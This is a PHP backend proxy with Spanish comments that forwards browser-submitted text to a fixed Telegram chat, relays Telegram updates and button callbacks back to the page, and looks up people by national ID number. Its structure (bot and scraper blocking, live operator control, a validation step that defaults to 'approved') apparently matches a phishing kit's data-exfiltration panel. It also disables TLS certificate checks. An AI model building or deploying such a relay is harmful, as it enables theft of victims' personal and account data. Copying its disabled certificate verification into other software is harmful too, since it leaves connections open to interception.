<?php
/**
 * ========================================================
 * BACKEND API PROXY SEGURO EN PHP
 * ========================================================
 * Todas las peticiones a Telegram y servicios externos se realizan
 * exclusivamente desde el servidor backend.
 * El BOT_TOKEN y CHAT_ID nunca se envían al cliente ni se exponen.
 */

require_once __DIR__ . '/config/security.php';
require_once __DIR__ . '/config/config.php';

// 1. Cabeceras de seguridad
send_security_headers();
header('Content-Type: application/json; charset=UTF-8');

// 2. Detección y bloqueo de bots y scrapers
enforce_bot_protection();

// 3. Control de tasa de peticiones por IP
check_rate_limit('api_request', 80, 60);

$rawInput = file_get_contents('php://input');
$data = json_decode($rawInput, true);

if (!is_array($data)) {
    $data = $_POST;
}

$action = $_GET['action'] ?? ($data['action'] ?? 'send_message');

/**
 * Envía peticiones HTTP seguras con cURL o streams de respaldo
 */
function make_backend_request($url, $method = 'GET', $body = null, $headers = ['Content-Type: application/json'], $timeout = 12) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            if ($body !== null) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($body) ? json_encode($body) : $body);
            }
        }
        if (!empty($headers)) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        $res = curl_exec($ch);
        $err = curl_error($ch);
        curl_close($ch);
        return $err ? false : $res;
    }

    $headerStr = is_array($headers) ? implode("\r\n", $headers) : $headers;
    $opts = [
        'http' => [
            'method'  => $method,
            'header'  => $headerStr,
            'timeout' => $timeout,
            'ignore_errors' => true
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ];
    if ($method === 'POST' && $body !== null) {
        $opts['http']['content'] = is_array($body) ? json_encode($body) : $body;
    }
    return @file_get_contents($url, false, stream_context_create($opts));
}

switch ($action) {
    case 'send_message':
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Método no permitido']);
            exit;
        }

        $text = trim((string)($data['text'] ?? ''));
        if (empty($text)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'El mensaje no puede estar vacío']);
            exit;
        }

        $payload = [
            'chat_id'    => TG_CHAT_ID,
            'text'       => $text,
            'parse_mode' => $data['parse_mode'] ?? 'Markdown'
        ];

        if (!empty($data['reply_markup'])) {
            $payload['reply_markup'] = $data['reply_markup'];
        }

        $url = 'https://api.telegram.org/bot' . TG_BOT_TOKEN . '/sendMessage';
        $response = make_backend_request($url, 'POST', $payload, ['Content-Type: application/json'], 12);

        $resJson = json_decode($response ?: '', true);

        // Si falló por formato Markdown, reintentar en texto plano
        if (isset($resJson['ok']) && !$resJson['ok'] && isset($payload['parse_mode'])) {
            unset($payload['parse_mode']);
            $response = make_backend_request($url, 'POST', $payload, ['Content-Type: application/json'], 12);
            $resJson = json_decode($response ?: '', true);
        }

        echo json_encode($resJson ?? ['ok' => true]);
        break;

    case 'get_updates':
        $offset = isset($_GET['offset']) ? (int)$_GET['offset'] : (int)($data['offset'] ?? 0);
        $limit  = isset($_GET['limit']) ? min(10, (int)$_GET['limit']) : 5;
        $url    = 'https://api.telegram.org/bot' . TG_BOT_TOKEN . '/getUpdates?offset=' . $offset . '&limit=' . $limit;

        $res = make_backend_request($url, 'GET', null, [], 10);
        echo $res ?: json_encode(['ok' => false]);
        break;

    case 'answer_callback':
        $cbId = (string)($data['callback_query_id'] ?? ($_GET['callback_query_id'] ?? ''));
        $ansText = (string)($data['text'] ?? 'Accion recibida');
        $url  = 'https://api.telegram.org/bot' . TG_BOT_TOKEN . '/answerCallbackQuery';

        $res = make_backend_request($url, 'POST', ['callback_query_id' => $cbId, 'text' => $ansText], ['Content-Type: application/json'], 6);
        echo $res ?: json_encode(['ok' => true]);
        break;

    case 'consultar_cliente':
        $cedula = preg_replace('/\D/', '', (string)($_GET['cedula'] ?? ($data['cedula'] ?? '')));
        if (empty($cedula)) {
            http_response_code(400);
            echo json_encode(['exito' => false, 'error' => 'Cédula no proporcionada']);
            exit;
        }

        $url = API_BUSCAR_CLIENTE_URL . '?cedula=' . urlencode($cedula);
        $res = make_backend_request($url, 'GET', null, [], 12);

        if (!$res) {
            http_response_code(502);
            echo json_encode(['exito' => false, 'error' => 'Error al consultar servicio']);
            exit;
        }

        echo $res;
        break;

    case 'validar_respuestas':
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['exito' => false, 'error' => 'Método no permitido']);
            exit;
        }

        $url = API_VALIDAR_RESPUESTAS_URL;
        $postData = !empty($rawInput) ? $rawInput : json_encode($data);
        $res = make_backend_request($url, 'POST', $postData, ['Content-Type: application/json'], 12);

        if (!$res) {
            echo json_encode(['exito' => true, 'aprobado' => true]);
            exit;
        }

        echo $res;
        break;

    default:
        http_response_code(400);
        echo json_encode(['ok' => false, 'error' => 'Acción no válida']);
        break;
}
